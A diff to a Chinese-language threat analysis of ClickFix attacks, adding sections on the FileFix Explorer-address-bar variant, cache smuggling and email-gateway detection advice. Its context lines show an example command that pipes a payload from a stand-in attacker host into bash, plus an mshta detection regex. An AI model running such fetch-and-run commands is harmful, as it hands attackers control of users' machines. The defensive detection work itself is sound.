@@ -85,6 +85,24 @@ osascript -e 'do shell script "curl -s http://attacker.site/mac_payload | bash"'
 
 载荷执行后，攻击者获得目标主机的远程控制权限。根据攻击者背景不同，可能部署勒索软件、数据窃取木马或持久性后门。
 
+## FileFix 变种：Explorer 地址栏 2048 字符新载体（2026）
+
+2026 年 8 月，安全研究社区披露了 ClickFix 家族的最新变种——**FileFix**（由 mr.d0x 于 2025 年首次提出概念，2026 年被实际攻击活动采用）。FileFix 将恶意命令的粘贴目标从 Windows 运行对话框（Win+R，长度限制约 260 字符）转移到 **Windows 资源管理器（Explorer）地址栏**，利用其高达 **2048 字符**的输入限制传输显著更大的载荷。
+
+* **载体对比**：运行对话框约 260 字符上限，难以承载完整混淆载荷；Explorer 地址栏允许 2048 字符，足以容纳编码后的 PowerShell 命令链
+* **伪装形式**：攻击页面伪装为 FortiClient 合规检查器（Compliance Checker）、验证码（CAPTCHA）等界面，诱导用户复制剪贴板内容并粘贴到 Explorer 地址栏
+* **执行机制**：粘贴到地址栏的 PowerShell 命令由 Explorer 解释执行，绕过对 cmd.exe/运行对话框行为的传统监控
+
+检测要点：Explorer 地址栏粘贴是用户不常见操作，EDR 可监控 explorer.exe 的异常命令行参数；邮件网关应对正文中「粘贴到资源管理器/地址栏/粘贴到 Explorer」类话术与 PowerShell 命令片段组合保持高警觉。
+
+## Cache Smuggling 组合攻击：与 FileFix 的叠加利用
+
+威胁研究者进一步发现，攻击者开始将 FileFix 社会工程技巧与 **Cache Smuggling（缓存走私）** 技术叠加使用，以规避安全控制。2025 年 10 月披露的攻击活动中，攻击者通过伪装成 FortiClient 合规检查器的钓鱼页面，诱导用户将剪贴板内容粘贴到 Explorer 地址栏——该页面同时利用浏览器缓存走私技术加载恶意载荷，避免与恶意代码建立直接网络连接。
+
+* **攻击链**：钓鱼页面（伪装合规检查）→ 剪贴板注入 → 粘贴到 Explorer 地址栏 → 执行 PowerShell → 从缓存走私路径加载恶意载荷
+* **规避效果**：载荷交付过程不触发传统 URL 信誉检测，恶意代码在本地缓存中执行，减少网络层可见性
+* **检测建议**：除既有 ClickFix 正则外，增加对浏览器缓存目录异常写入、explorer.exe 执行 PowerShell 的父子进程链监控
+
 ## 邮件网关检测规则设计
 
 ### 检测原则
@@ -168,6 +186,9 @@ regex: /mshta\s+http/i
 * Halcyon Research, *ClickFix Campaign Analysis Q1-Q2 2026*
 * MITRE ATT&CK, *T1218.010 System Binary Proxy Execution: regsvr32*
 * Trend Micro, *MacSync: New Mac-Targeted ClickFix Variant*, 2026-02
+* mr.d0x, *FileFix - A ClickFix Alternative*（Explorer 地址栏 2048 字符载体）
+* Cybersecurity News, *Threat Actors Merging FileFix and Cache Smuggling Attacks*, 2025-10
+* BleepingComputer, *Interlock Ransomware Adopts FileFix*, 2025-07
 
 ### 相关主题
 
